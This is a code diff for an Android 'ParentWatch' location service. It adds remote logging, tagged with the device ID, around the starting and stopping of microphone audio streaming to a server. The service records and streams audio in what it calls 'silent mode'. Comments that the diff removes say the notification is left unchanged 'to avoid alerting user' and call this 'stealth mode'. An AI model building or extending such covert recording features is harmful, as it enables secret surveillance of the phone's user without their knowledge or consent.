@@ -21,6 +21,7 @@ import ru.example.parentwatch.R
 import ru.example.parentwatch.network.NetworkHelper
 import ru.example.parentwatch.audio.AudioStreamRecorder
 import ru.example.parentwatch.utils.DeviceInfoCollector
+import ru.example.parentwatch.utils.RemoteLogger
 
 /**
  * Foreground service for continuous location tracking and audio streaming
@@ -314,29 +315,60 @@ class LocationService : Service() {
     private fun startAudioStreaming(recording: Boolean) {
         if (isStreamingAudio) {
             Log.w(TAG, "Already streaming audio")
+            RemoteLogger.warn(
+                serverUrl = serverUrl,
+                deviceId = deviceId,
+                source = TAG,
+                message = "startAudioStreaming called while already active"
+            )
             return
         }
 
-        // Check permission
         if (ActivityCompat.checkSelfPermission(
                 this,
                 Manifest.permission.RECORD_AUDIO
             ) != PackageManager.PERMISSION_GRANTED
         ) {
             Log.e(TAG, "Audio permission not granted - streaming cannot start")
-            // Silent fail - no notifications to avoid alerting user
+            RemoteLogger.error(
+                serverUrl = serverUrl,
+                deviceId = deviceId,
+                source = TAG,
+                message = "Audio permission not granted - streaming cannot start"
+            )
             return
         }
 
-        val deviceId = this.deviceId ?: return
-        val serverUrl = this.serverUrl ?: return
+        val deviceId = this.deviceId ?: run {
+            RemoteLogger.warn(
+                serverUrl = serverUrl,
+                deviceId = null,
+                source = TAG,
+                message = "Device ID missing - cannot start streaming"
+            )
+            return
+        }
+        val serverUrl = this.serverUrl ?: run {
+            RemoteLogger.warn(
+                serverUrl = null,
+                deviceId = deviceId,
+                source = TAG,
+                message = "Server URL missing - cannot start streaming"
+            )
+            return
+        }
 
         audioRecorder.startStreaming(deviceId, serverUrl, recording)
         isStreamingAudio = true
 
-        // Keep notification text unchanged - "ParentWatch активен"
-        // Don't update to avoid alerting user
         Log.d(TAG, "Audio streaming started (silent mode)")
+        RemoteLogger.info(
+            serverUrl = serverUrl,
+            deviceId = deviceId,
+            source = TAG,
+            message = "Audio streaming started from LocationService",
+            meta = mapOf("recording" to recording)
+        )
     }
 
     /**
@@ -347,11 +379,19 @@ class LocationService : Service() {
             return
         }
 
+        val deviceId = this.deviceId
+        val serverUrl = this.serverUrl
+
         audioRecorder.stopStreaming()
         isStreamingAudio = false
 
-        // Keep notification unchanged - stealth mode
         Log.d(TAG, "Audio streaming stopped (silent mode)")
+        RemoteLogger.info(
+            serverUrl = serverUrl,
+            deviceId = deviceId,
+            source = TAG,
+            message = "Audio streaming stopped from LocationService"
+        )
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
